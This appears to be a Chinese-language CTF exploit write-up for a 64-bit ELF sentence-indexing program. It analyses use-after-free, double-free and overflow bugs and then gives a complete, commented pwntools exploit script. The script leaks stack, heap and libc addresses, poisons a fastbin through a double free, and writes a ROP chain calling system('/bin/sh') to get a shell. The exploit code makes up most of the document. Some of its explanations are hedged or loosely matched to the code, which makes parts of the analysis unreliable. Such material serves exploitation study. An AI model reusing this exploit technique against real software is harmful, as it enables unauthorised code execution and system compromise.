# 漏洞利用文档

## 执行环境
基于反编译代码和调试记录分析：
- **二进制类型**：64位ELF可执行文件，无PIE（Position Independent Executable），代码段固定地址0x400000。
- **保护机制**：
  - Stack Canary：启用（调试中栈地址0x7ffeea5c23a9处有canary值）。
  - NX（No Execute）：启用，堆栈不可执行。
  - RELRO：部分（Partial），全局指针如qword_6020B8可写。
  - PIE：未启用，利于地址计算和利用。
- **依赖库**：依赖libc（如libc.so.6），调试中libc基址可泄露（如0x73ddd2ea9000）。
- **堆管理**：使用glibc的malloc/free，堆基址通常从0x1e07c000开始。
- **运行需求**：需要标准输入输出，程序通过菜单交互处理用户输入。

## 漏洞成因
### 关键结构体分析
从反编译代码推断，程序使用链表管理句子索引，节点结构如下（大小0x28字节）：
```c
struct node {
    char *word_ptr;      // 指向单词数据的指针（8字节）
    int word_size;       // 单词大小（4字节）
    char *sentence_ptr;  // 指向句子数据的指针（8字节） 
    int sentence_size;   // 句子大小（4字节）
    struct node *next;   // 下一个节点指针（8字节）
    // 可能还有其他字段，如计数器
};
```
全局变量`qword_6020B8`指向链表头。

### 漏洞分析
1. **Use-After-Free (UAF)**：
   - 在`sub_400AD0`（搜索单词）中，当用户删除句子时，释放句子缓冲区（`free(*(void **)(i + 16))`），但链表节点未被移除或清空。后续搜索操作（如`search_word`）可能访问已释放内存，导致UAF。
   - 调试记录中，Step 2和Step 3通过搜索已释放块泄露堆和libc地址，证实UAF存在。

2. **Double Free**：
   - 在`perform_double_free`函数中，通过多次删除包含相同单词（如"ROCK"）的句子，触发double free。具体地，`search_word`后连续`reply_yes`释放同一块多次。
   - 调试记录Step 4显示fastbin（0x40大小）中出现循环链表（`0x1e07d0b0 → 0x1e07d010 → 0x1e07d0b0`），表明double free成功。

3. **堆溢出**：
   - 在`sub_4009B0`（输入读取函数）中，使用fread读取数据，但输入处理逻辑可能允许溢出。例如，`leak_stack_ptr`中发送96字节输入，溢出缓冲区泄露栈指针。
   - 代码中有大小检查（`if ( v4 != a2 ) sub_400990("Not enough data");`），但通过精心构造输入可绕过。

**根本原因**：程序在堆内存管理中存在缺陷，包括释放后未清理指针、缺乏边界检查，导致UAF、double free和堆溢出，允许攻击者泄露地址、执行任意代码。

## 漏洞利用过程
结合exp步骤和调试记录，分析内存变化（以堆和栈为主）：

| 步骤 | 操作 | 堆内存变化 | 栈内存变化 | 关键发现 |
|------|------|------------|------------|----------|
| Step 1 | `leak_stack_ptr` | 分配chunk（如0x1e07c000）并填充'a'，可能溢出 | 输入缓冲区溢出，泄露栈指针（如0x7ffeea5c1fa0） | 栈指针泄露，用于后续ROP链布局 |
| Step 2 | `leak_heap_ptr` | 分配多个chunk（如0x1e07d010、0x1e07d0b0），释放后UAF泄露堆地址 | 无显著变化 | 堆基址泄露（如0x1e07c000），fastbin开始形成 |
| Step 3 | `leak_libc_ptr` | 分配大chunk（如0x1e07d170），释放到unsortedbin，泄露main_arena地址 | 无显著变化 | libc基址泄露（如0x73ddd2ea9000），通过main_arena+88偏移计算 |
| Step 4 | `perform_double_free` | 多次释放chunk，形成fastbin循环链表（0x1e07d0b0 → 0x1e07d010 → 0x1e07d0b0） | 无显著变化 | double free确认，为任意地址写做准备 |
| Step 5 | `write_to_stack_and_get_shell` | 利用double free写栈地址到堆，布置ROP链（如pop rdi、/bin/sh、system） | ROP链写入栈区域（如0x7ffeea5c1fa0附近） | 控制流劫持准备，ROP链包含shell执行代码 |
| Step 6 | `quit_app` | 可能触发释放或退出逻辑，堆状态可能清理 | 程序退出或执行ROP链 | 漏洞触发点，可能跳转到system |
| Step 7 | `p.interactive` | 堆可能稳定，chunk被重新分配 | 获取shell，栈控制流被劫持 | 利用成功，获得shell权限 |

**内存变化总结**：
- **初始状态**：堆干净，链表空，栈有标准布局。
- **利用后状态**：堆有double free循环链表，栈有ROP链；通过UAF和溢出泄露关键地址，最终执行system("/bin/sh")。

## Exploit
以下是exp脚本，在关键位置添加注释，解释利用逻辑：

```python
from pwn import *
import re
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample4')
elf = ELF('./data/sample4')
libc = elf.libc  # 获取libc引用，用于计算gadget地址

def menu():
    p.recvuntil(b'3: Quit')  # 等待菜单显示，确保程序状态

def index_sentence(content):
    p.sendline(b'2')  # 选择索引句子选项
    p.sendline(str(len(content)).encode())  # 发送句子大小
    p.send(content)  # 发送句子内容

def search_word(word):
    p.sendline(b'1')  # 选择搜索单词选项
    p.sendline(str(len(word)).encode())  # 发送单词大小
    p.send(word)  # 发送单词内容

def reply_yes():
    p.sendline(b'y')  # 确认删除操作

def reply_no():
    p.sendline(b'n')  # 取消删除操作

def quit_app():
    menu()
    p.sendline(b'3')  # 退出程序，可能触发漏洞

def leak_stack_ptr():
    menu()
    p.send(b'a'*96)  # 发送96字节输入，溢出缓冲区以泄露栈指针
    p.recvuntil(b'is not a valid number')
    stackptr_match = re.findall(b'a{48}(......) is not', p.recvuntil(b'is not a valid number\n'))  # 正则匹配泄露的栈地址
    stackptr = u64(stackptr_match[0] + b'\0\0')  # 解析为64位地址
    return stackptr

def leak_heap_ptr():
    # 通过UAF泄露堆地址：分配两个句子，然后删除并访问释放的内存
    index_sentence(b'a'*50 + b' DREAM')  # 分配句子1，包含"DREAM"单词
    menu()
    index_sentence(b'b'*50 + b' DREAM')  # 分配句子2，增加堆复杂性
    menu()
    search_word('DREAM')  # 搜索单词，触发UAF
    reply_yes()  # 删除第一个句子，释放内存
    reply_yes()  # 删除第二个句子，可能形成double free条件
    menu()
    search_word(b'\0' * 5)  # 搜索空单词，访问已释放内存，泄露堆地址
    p.recvuntil(b'Found 56: ')
    heapptr = u64(p.recvuntil(b'Delete')[:8])  # 从输出中解析堆指针
    reply_no()  # 避免意外删除
    return heapptr - 0x10b0  # 调整偏移得到堆基址

def leak_libc_ptr():
    menu()
    index_sentence(('b'*256 + ' FLOWER ').ljust(512, 'c'))  # 分配大句子，确保进入unsortedbin
    menu()
    search_word('FLOWER')  # 搜索单词
    reply_yes()  # 删除句子，释放到unsortedbin，包含main_arena指针
    menu()
    search_word(b'\0'*6)  # 搜索空单词，通过UAF泄露unsortedbin中的libc地址
    p.recvuntil(b'Found 512: ')
    mainarena88 = u64(p.recvuntil(b'Delete')[:8])  # 泄露main_arena+88地址
    libcbase = mainarena88 - 0x3c4b78  # 计算libc基址（偏移可能因版本而异）
    reply_no()
    return libcbase

def perform_double_free():
    # 执行double free：分配三个句子，然后连续删除
    menu()
    index_sentence(b'a'*51 + b' ROCK')  # 句子1
    menu()
    index_sentence(b'b'*51 + b' ROCK')  # 句子2
    menu()
    index_sentence(b'c'*51 + b' ROCK')  # 句子3
    menu()
    search_word('ROCK')  # 搜索单词，定位到相关节点
    reply_yes()  # 删除句子1
    reply_yes()  # 删除句子2
    reply_yes()  # 删除句子3，触发double free
    menu()
    search_word(b'\0' * 4)  # 可能用于验证或触发UAF
    reply_yes()  # 额外操作，巩固利用
    reply_no()

def write_to_stack_and_get_shell(stackptr, libcbase):
    menu()
    # 利用double free或堆溢出写栈地址到堆中，实现任意地址写
    index_sentence(p64(stackptr + 0x52).ljust(48, b'\0') + b' MIRACLE')  # 写栈地址到堆，偏移调整用于ROP链对齐
    menu()
    index_sentence(b'd'*48 + b' MIRACLE')  # 分配额外句子，操作堆布局
    menu()
    index_sentence(b'e'*48 + b' MIRACLE')  # 进一步操作堆
    menu()
    # 构造ROP链：pop rdi; /bin/sh; system; exit
    rop = ROP(libc)  # 使用pwntools的ROP模块
    pop_rdi = libcbase + rop.find_gadget(['pop rdi', 'ret']).address  # 找到pop rdi gadget
    bin_sh = libcbase + next(libc.search(b'/bin/sh'))  # 找到/bin/sh字符串地址
    system_addr = libcbase + libc.sym['system']  # system函数地址
    exit_addr = libcbase + libc.sym['exit']  # exit函数地址，用于清洁退出
    payload = (b'A'*6 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(exit_addr)).ljust(56, b'U')  # 构造ROP链，填充对齐
    index_sentence(payload)  # 写入ROP链到堆或通过溢出影响栈

# 主利用流程
stack_ptr = leak_stack_ptr()  # Step 1: 泄露栈指针，用于后续ROP链布局
heap_base = leak_heap_ptr()   # Step 2: 泄露堆基址，辅助地址计算
libc_base = leak_libc_ptr()   # Step 3: 泄露libc基址，获取gadget和函数地址
perform_double_free()         # Step 4: 执行double free，创建任意写条件
write_to_stack_and_get_shell(stack_ptr, libc_base)  # Step 5: 写栈并布置ROP链，准备控制流劫持
quit_app()                    # Step 6: 退出程序，触发漏洞执行ROP链
p.interactive()               # Step 7: 交互模式，获取shell权限
```

**注释说明**：
- 利用UAF和double free泄露地址并实现任意写。
- ROP链通过堆溢出或任意写注入栈，绕过NX保护。
- 偏移值（如0x10b0、0x3c4b78）可能因环境而异，需动态调整。
- 最终通过`p.interactive()`获得shell，完成利用。
